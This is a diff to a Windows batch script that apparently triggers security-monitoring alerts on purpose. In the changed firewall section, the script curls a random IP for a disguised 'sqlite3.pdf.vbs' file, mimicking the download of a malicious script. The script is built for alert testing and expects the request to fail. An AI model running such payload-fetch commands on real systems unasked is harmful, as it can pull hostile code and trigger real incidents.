@@ -17,7 +17,7 @@ powershell -command "Invoke-WebRequest -Uri 'https://www.cisco.com/content/dam/c
 ::echo.
 ::FIREWALL
 echo.
-echo Firewall: This command will Trigger a Firewall DNS Alert by attempting a wget to a malicous looking (benign) site internetbadguys.com. It is expected this attempt will fail. Please wait.
+echo Firewall: This command will Trigger a Firewall alert by requesting vbs script from a random IP using CURL. It is expected this attempt will fail. Please wait.
 echo.
 echo It is expected this attempt will fail. Please wait.
 set /a x1=(%RANDOM% %% 256)
@@ -25,7 +25,9 @@ set /a x2=(%RANDOM% %% 256)
 set /a x3=(%RANDOM% %% 256)
 set /a x4=(%RANDOM% %% 256)
 set "url=http://%x1%.%x2%.%x3%.%x4%/aN7jD0qO6kT5bK5bQ4eR8fE1xP7hL2vK/sqlite3.pdf.vbs"
+@echo on
 curl "%url%"
+@echo off
 ::NDR
 :: Batch file to emulate DNS abuse using PowerShell
 echo.
